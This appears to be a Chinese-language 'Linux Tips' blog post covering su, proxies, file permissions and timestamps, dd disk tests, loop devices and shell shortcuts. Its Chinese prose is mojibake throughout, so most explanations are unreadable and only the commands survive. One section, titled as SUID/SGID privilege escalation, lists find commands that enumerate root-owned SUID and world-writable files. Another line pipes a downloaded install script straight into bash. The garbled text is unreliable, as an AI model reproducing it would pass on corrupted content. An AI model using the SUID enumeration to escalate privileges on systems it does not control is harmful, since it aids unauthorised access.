çš„è¾“å‡ºæ˜¯ä¸€è‡´çš„ æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²ï¼ˆfind printable stringsï¼‰ï¼Œä¾‹å¦‚ï¼š\n1 2 # æŸ¥çœ‹ /bin ç›®å½•ä¸‹çš„ç¨‹åºå¯èƒ½ä¼šåˆ›å»ºå“ªäº›ä¸´æ—¶æ–‡ä»¶ strings /bin/* | grep tmp ä»£ç†ç›¸å…³ å¦‚æœä½ çš„ http_proxy éœ€è¦ç™»å½•ï¼Œå¯ä»¥è®¾ç½®å¦‚ä¸‹ï¼š\nexport http_proxy=http://username:password@host:port\nè¿‡æ»¤ã€æŠ¥å‘Šç›¸åŒè¡Œ uniq\nç›¸åŒè¡Œä»…æ‰“å°ä¸€æ¬¡\nuniq -c è¡Œé¦–æ’å…¥è¯¥è¡Œé‡å¤å‡ºç°çš„æ¬¡æ•°\nuniq -d ä»…è¾“å‡ºç›¸åŒè¡Œ\nuniq -u ä»…è¾“å‡ºä¸åŒè¡Œ\nç³»ç»Ÿç®¡ç†ç›¸å…³ ç”¨æˆ·ç®¡ç† usermod -a -G sudo user1 å°† user1 å¢åŠ åˆ° sudo ç»„\nsu - user\nå½“ä½ ä½¿ç”¨å¸¦æœ‰ç ´æŠ˜å·çš„ su - user1 å‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\nåˆ‡æ¢åˆ° user1 è´¦æˆ·ã€‚ é‡æ–°åˆå§‹åŒ–ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬ PATHã€HOMEã€SHELL ç­‰ï¼Œä½¿å…¶ä¸ user1 çš„é»˜è®¤è®¾ç½®ä¸€è‡´ã€‚è¿™äº›è®¾ç½®é€šå¸¸åœ¨ /etc/passwd æ–‡ä»¶å’Œ user1 çš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚ .bashrcã€.bash_profile ç­‰ï¼‰ä¸­å®šä¹‰ã€‚ å°†å·¥ä½œç›®å½•åˆ‡æ¢åˆ° user1 çš„ä¸»ç›®å½•ã€‚ å¦‚æœå®šä¹‰äº†ç™»å½•è„šæœ¬ï¼ˆå¦‚ .bash_profile æˆ– .profileï¼‰ï¼Œåˆ™æ‰§è¡Œè¿™äº›è„šæœ¬ã€‚ ä½¿ç”¨ä¸å¸¦ç ´æŠ˜å·çš„ su user1 å‘½ä»¤æ—¶ï¼Œåªä¼šåˆ‡æ¢åˆ° user1 è´¦æˆ·ï¼Œä½†ä¸ä¼šé‡ç½®ç¯å¢ƒå˜é‡æˆ–æ›´æ”¹å·¥ä½œç›®å½•ã€‚è¿™æ„å‘³ç€ï¼Œå³ä½¿ä½ å·²ç»åˆ‡æ¢åˆ°äº†å¦ä¸€ä¸ªç”¨æˆ·ï¼Œå½“å‰ç¯å¢ƒä»ç„¶ä¿ç•™äº†åŸå§‹ç”¨æˆ·çš„è®¾ç½®ã€‚\næ€»ä¹‹ï¼Œä½¿ç”¨å¸¦æœ‰ç ´æŠ˜å·çš„ su - user1 å‘½ä»¤å¯ä»¥æ›´å¥½åœ°æ¨¡æ‹Ÿä¸€ä¸ªå®Œæ•´çš„ç™»å½•ç¯å¢ƒï¼Œè€Œä¸ä»…ä»…æ˜¯åˆ‡æ¢ç”¨æˆ·ã€‚åœ¨éœ€è¦ä»¥å¦ä¸€ä¸ªç”¨æˆ·çš„å®Œæ•´ç¯å¢ƒæ‰§è¡Œä»»åŠ¡æ—¶ï¼Œå»ºè®®ä½¿ç”¨å¸¦ç ´æŠ˜å·çš„ su - å‘½ä»¤ã€‚\nscript /dev/null è¯¥å‘½ä»¤å¯ä»¥è§£å†³ su åˆ‡æ¢ç”¨æˆ·åï¼Œè¿è¡Œ screen ç¨‹åºæ—¶æŠ¥é”™ï¼š\n1 Cannot open your terminal '/dev/pts/0' - please check. çš„é—®é¢˜ã€‚\nåŸç†æ˜¯ script å‘½ä»¤ä¼šå¼€å¯ä¸€ä¸ªæ–°çš„ä¼ªç»ˆç«¯ï¼ˆpseudo-terminalï¼‰ï¼Œç”¨æ¥ dump ç»ˆç«¯ä¸Šçš„æ‰€æœ‰è¾“å‡ºã€‚\n1 2 3 4 5 # æŸ¥çœ‹ CPU æ€»æ ¸å¿ƒæ•° grep -c 'model name' /proc/cpuinfo # æŸ¥çœ‹ã€é…ç½®èµ„æºé™åˆ¶ ulimit -a æµ‹è¯•ç¡¬ç›˜é€Ÿåº¦ 1 2 3 4 5 # bs é»˜è®¤ä¸º 512 å­—èŠ‚ï¼Œå•ä½æ”¯æŒ k/m ï¼ˆmacOS å¹³å°å¦‚æ­¤ï¼ŒLinux ä¸Šä¸ä¸€æ ·ï¼‰ # write dd of=${path_on_disk} if=/dev/zero bs=1m count=1000 # read dd if=${path_on_disk} of=/dev/null bs=1m ç›‘æ§ç£ç›˜ IO æƒ…å†µ 1 iostat 1 2 3 disk0 disk2 disk3 cpu load average KB/t tps MB/s KB/t tps MB/s KB/t tps MB/s us sy id 1m 5m 15m 26.18 95 2.42 25.87 0 0.00 287.74 0 0.00 4 2 94 1.95 1.64 1.56 æ–‡ä»¶æƒé™ 1 2 3 4 5 6 7 8 9 10 # æ›´æ”¹æ–‡ä»¶å±ç»„ chgrp [-R] group filename # æ›´æ”¹æ–‡ä»¶å±ä¸» chown [-R] owner filename chown [-R] owner:group filename # æ›´æ”¹æ–‡ä»¶å±æ€§ chmod u=rwx,g=rx,o=r test1 chmod a-x test1 SUID, SGID, sticky bit\n1 2 3 4 5 6 7 8 9 10 11 # ä¸ºç¨‹åºè®¾ç½® SGID, ç¨‹åºå°†ä»¥æ–‡ä»¶æ‰€å±ç»„çš„æƒé™è¿è¡Œ chmod g+s executable # ä¸ºç¨‹åºè®¾ç½® SUID, ç¨‹åºå°†ä»¥æ–‡ä»¶å±ä¸»çš„æƒé™è¿è¡Œ chmod u+s executable # ä¸ºç›®å½•è®¾ç½® SGID, è¯¥ç›®å½•ä¸‹æ–°å»ºçš„æ–‡ä»¶æˆ–ç›®å½•çš„ç»„å°†é»˜è®¤ä¸ºè¯¥ç›®å½•çš„ç»„ chmod g+s directory # è®¾ç½® sticky bit, è¯¥ç›®å½•ä¸‹æ–°å»ºçš„æ–‡ä»¶æˆ–ç›®å½•ä¸èƒ½è¢«éowneråˆ é™¤ï¼ˆè¯¥ç›®å½•çš„å±ä¸»æ˜¯ä¸ªä¾‹å¤–ï¼Œå¯ä»¥åˆ é™¤ä»»æ„æ–‡ä»¶ï¼‰ chmod +t directory SUID/SGID ææƒ\nSUID (Set UID)æ˜¯Linuxä¸­çš„ä¸€ç§ç‰¹æ®Šæƒé™ï¼Œå…¶åŠŸèƒ½ä¸ºç”¨æˆ·è¿è¡ŒæŸä¸ªç¨‹åºæ—¶ï¼Œå¦‚æœè¯¥ç¨‹åºæœ‰SUIDæƒé™ï¼Œé‚£ä¹ˆç¨‹åºè¿è¡Œä¸ºè¿›ç¨‹æ—¶ï¼Œè¿›ç¨‹çš„å±ä¸»ä¸æ˜¯å‘èµ·è€…ï¼Œè€Œæ˜¯ç¨‹åºæ–‡ä»¶æ‰€å±çš„å±ä¸»ã€‚ä½†æ˜¯SUIDæƒé™çš„è®¾ç½®åªé’ˆå¯¹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶,å¯¹äºéå¯æ‰§è¡Œæ–‡ä»¶è®¾ç½®SUIDæ²¡æœ‰ä»»ä½•æ„ä¹‰.\nåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨è€…ä¼šæš‚æ—¶è·å¾—è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…æƒé™,ä¸”è¯¥æƒé™åªåœ¨ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ. é€šä¿—çš„æ¥è®²,å‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ls,å…¶å±ä¸»ä¸ºroot,å½“æˆ‘ä»¬é€šè¿‡érootç”¨æˆ·ç™»å½•æ—¶,å¦‚æœlsè®¾ç½®äº†SUIDæƒé™,æˆ‘ä»¬å¯åœ¨érootç”¨æˆ·ä¸‹è¿è¡Œè¯¥äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶,åœ¨æ‰§è¡Œæ–‡ä»¶æ—¶,è¯¥è¿›ç¨‹çš„æƒé™å°†ä¸ºrootæƒé™.\n1 2 3 4 5 # è®¾ç½®SUIDä½ chmod u+s filename # å»æ‰SUIDè®¾ç½® chmod u-s filename ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚å‡†ç¡®çš„è¯´ï¼Œè¿™ä¸ªå‘½ä»¤å°†ä»/ç›®å½•ä¸­æŸ¥æ‰¾å…·æœ‰SUIDæƒé™ä½ä¸”å±ä¸»ä¸ºrootçš„æ–‡ä»¶å¹¶è¾“å‡ºå®ƒä»¬ï¼Œç„¶åå°†æ‰€æœ‰é”™è¯¯é‡å®šå‘åˆ°/dev/nullï¼Œä»è€Œä»…åˆ—å‡ºè¯¥ç”¨æˆ·å…·æœ‰è®¿é—®æƒé™çš„é‚£äº›äºŒè¿›åˆ¶æ–‡ä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 # åˆ—å‡ºæ‰€æœ‰ SUID æ–‡ä»¶ find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; # åˆ—å‡ºæ‰€æœ‰ SGID æ–‡ä»¶ find / -type f -perm -04000 -ls # åˆ—å‡ºæ‰€æœ‰å…¨å±€å¯å†™æ–‡ä»¶ find / -perm -2 -type f -print æ–‡ä»¶æ—¶é—´æˆ³ atime\nAccess Time\nå‡ºäºæ€§èƒ½è€ƒè™‘ï¼Œä¸€èˆ¬ mount çš„æ—¶å€™ä¼šå¢åŠ å¦‚ä¸‹é€‰é¡¹ï¼Œå¯¼è‡´ atime è¡¨ç°å’Œé¢„æœŸä¸ä¸€è‡´ï¼š\n- ``noatime`` Do not update the file access time when reading from a file - ``relatime`` Update inode access times relative to modify or change time. Access time is only updated if the previous access time was earlier than the current modify or change time. ls -lu åˆ—å‡º atimeï¼Œ ls -ltu æŒ‰ atime æ’åºï¼ˆæœ€è¿‘çš„æ’æœ€ä¸Šé¢ï¼‰\nmtime\nModify Timeï¼Œæœ€åä¸€æ¬¡ä¿®æ”¹æ–‡ä»¶ï¼ˆå†…å®¹ï¼‰æˆ–è€…ç›®å½•ï¼ˆå†…å®¹ï¼‰çš„æ—¶é—´ ls -l ls -lt é»˜è®¤ä½¿ç”¨ mtime cp æ–‡ä»¶é»˜è®¤ä¼šæ”¹å˜ mtime + ctime cp -a åªä¼šæ”¹å˜ ctimeï¼Œmtime ä¸å˜ ctime\nChange Timeï¼Œæœ€åä¸€æ¬¡æ”¹å˜æ–‡ä»¶ï¼ˆå±æ€§æˆ–æƒé™ï¼‰æˆ–è€…ç›®å½•ï¼ˆå±æ€§æˆ–æƒé™ï¼‰çš„æ—¶é—´ ls -lc ls -ltc ä½¿ç”¨ ctime 1 2 3 4 5 6 7 8 9 10 stat filename # sort by mtime ls -lt # sort by ctime ls -ltc ls -alR \u003e /path/to/timestamp_modification.txt ls -alRc \u003e /path/to/timestamp_creation.txt æ–‡ä»¶æ‰“æ´ å¦‚ä½•åœ¨ä¸€ä¸ªå¤§æ–‡ä»¶ï¼ˆä¾‹å¦‚ \u003e500Gï¼‰çš„å¼€å¤´ï¼Œé«˜æ•ˆçš„æ’å…¥ä¸€äº›å†…å®¹ï¼Ÿ\nå¦‚æœæ˜¯ Linuxe + ext4/XFSï¼Œå¯ä»¥è€ƒè™‘ç”¨ fallocate å‡½æ•°ï¼ŒFALLOC_FL_INSERT_RANGE æ ‡è®°ä½ã€‚\nå‚è€ƒï¼šhttps://stackoverflow.com/questions/37882286/prepend-to-very-large-file-in-fixed-time-or-very-fast/37884191#37884191\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 # å­ç›®å½•æŒ‰å ç”¨ç©ºé—´å¤§å°æ’åº du -d 1 |sort -n # æŸ¥çœ‹ CPU æ€»æ ¸å¿ƒæ•° grep -c 'model name' /proc/cpuinfo # åœ¨ /bin æˆ–è€… /usr/sbin ä¸­è¿è¡Œï¼Œæœç´¢å“ªäº›ç¨‹åºä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ strings * | grep tmp # æŸ¥çœ‹èµ„æºé™åˆ¶çš„è®¾ç½® ulimit -a # æµ‹è¯•ç¡¬ç›˜é€Ÿåº¦ # bs é»˜è®¤ä¸º 512 å­—èŠ‚ï¼Œå•ä½æ”¯æŒ k/m ï¼ˆmacOS ä¸Šï¼ŒLinux ä¸ä¸€æ ·ï¼‰ dd of=/Volumes/disk-1t/1.out if=/dev/zero bs=1m count=10000 dd if=/Volumes/disk-1t/1.out of=/dev/null bs=1m # ç›‘æ§ç£ç›˜ io æƒ…å†µï¼Œ-p æŒ‡å®š æŸä¸ªï¼ˆæˆ–æŸäº›ï¼‰ç£ç›˜ iostat -x 1 # æ˜¾ç¤ºå½“å‰æ—¶é—´é…ç½®ä¿¡æ¯ timedatectl show # å°†æœ¬åœ°æ—¶é—´åŒæ­¥åˆ° rtc æ—¶é’Ÿï¼Œè§£å†³ Windows 10 çš„ç³»ç»Ÿæ—¶é—´ä¸å¯¹çš„é—®é¢˜ï¼ˆä¼šä¿®æ”¹é…ç½®æ–‡ä»¶/etc/adjtimeï¼‰ timedatectl set-local-rtc 1 # lazy umount umount -l # ä¸‹è½½è„šæœ¬å¹¶ç«‹å³æ‰§è¡Œ curl --compressed -o- -L https://yarnpkg.com/install.sh | bash # æ–‡ä»¶æ¢å¤åˆ°æŸä¸ª revision git checkout c5f567 -- file1/to/restore file2/to/restore # æ–‡ä»¶æ¢å¤åˆ°æŸä¸ª revision ä¹‹å‰çš„ 1 ä¸ªç‰ˆæœ¬ git checkout c5f567~1 -- file1/to/restore file2/to/restore pgrep process-name pkill process-name loopback device loopback device å¯ä»¥å°†æ–‡ä»¶ä½œä¸ºè®¾å¤‡æ¥æŒ‚è½½ï¼Œç±»ä¼¼äºè™šæ‹Ÿæœºçš„é•œåƒæ–‡ä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # åˆ›å»ºä¸€ä¸ªç¨€ç–æ–‡ä»¶ï¼ˆsparse fileï¼‰ dd if=/dev/zero of=1.img bs=1 count=0 seek=512M # å°† 1.img è‡ªåŠ¨ç»‘å®šåˆ°ä¸€ä¸ªå¯ç”¨çš„ loop device # -P, --partscanï¼šæ‰«æåˆ†åŒº sudo losetup -fP 1.img # åˆ—å‡ºå½“å‰çš„ loop devices losetup # åˆ†åŒº sudo fdisk /dev/loop13 # åˆ†åŒºä¹‹åå¯ä»¥çœ‹åˆ°åˆ†åŒºçš„è®¾å¤‡å·ï¼Œä¾‹å¦‚è¿™é‡Œä¸º /dev/loop13p1 # å°†åˆ†åŒºæ ¼å¼åŒ–ä¸º ext4 æ–‡ä»¶ç³»ç»Ÿ sudo mkfs.ext4 /dev/loop13p1 # æŒ‚è½½ loop device sudo mount /dev/loop13p1 /mount/point # åˆ é™¤ loopback device sudo umount /mount/point sudo losetup -d /dev/loop13p ç¨€ç–æ–‡ä»¶ï¼ˆsparse file) çš„ç‰¹ç‚¹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ dd if=/dev/zero of=sparse_file bs=1 count=0 seek=512M 0+0 records in 0+0 records out 0 bytes copied, 0.000138743 s, 0.0 kB/s $ ls -lh sparse_file -rw-rw-r-- 1 user user 512M 2æœˆ 2 22:36 sparse_file $ du -sh sparse_file 0 sparse_file # -sï¼šæŸ¥çœ‹å®é™…åˆ†é…çš„å°ºå¯¸ $ ls -lhs sparse_file 0 -rw-r--r-- 1 user user 512M 2æœˆ 2 22:36 sparse_file å¦‚æœå°† sparse file ä½œä¸ºé•œåƒæ–‡ä»¶æŒ‚è½½ï¼Œä¼šéšç€åœ¨è®¾å¤‡ä¸­æ–‡ä»¶çš„å†™å…¥ï¼Œé•œåƒæ–‡ä»¶çš„å°ºå¯¸æ‰ä¼šé€æ¸å¢å¤§ã€‚\nå¸¸ç”¨ Console å¿«æ·é”® å¿«æ·é”® åŠ¨ä½œ ctrl+l æ¸…å± ctrl+d é€€å‡ºshell ctrl+u æ¸…é™¤å…‰æ ‡ä¹‹å‰ ctrl+k æ¸…é™¤å…‰æ ‡ä¹‹å ctrl+w æ¸…é™¤å…‰æ ‡ä¹‹å‰çš„ä¸€ä¸ªå•è¯ ctrl+y ç²˜è´´åˆšæ‰ctrl+u/k/wçš„å†…å®¹ ctrl+t äº¤æ¢æœ€åä¸¤ä¸ªå­—ç¬¦ esc+k äº¤æ¢æœ€åä¸¤ä¸ªå•è¯ alt+f/ctrl+b å‘å‰/åç§»åŠ¨ä¸€ä¸ªå•è¯ ctrl+f/ctrl+b å‘å‰/åç§»åŠ¨ä¸€ä¸ªå­—ç¬¦ alt+d/ctrl+d åˆ é™¤å…‰æ ‡åçš„ä¸€ä¸ªå•è¯/å­—ç¬¦ ctrl-n/ctrl-p ä¸Šä¸€ä¸ª/ä¸‹ä¸€ä¸ªå‘½ä»¤ ctrl-/ undo ctrl-r reverse-i-search ! history substitution !n Refer to command line n. !-n Refer to the current command line minus n. !! Refer to the previous command. This is a synonym for `!-1'. ","description":"","tags":["tools","linux"],"title":"Linux Tips","uri":"/posts/linux-tips/"}]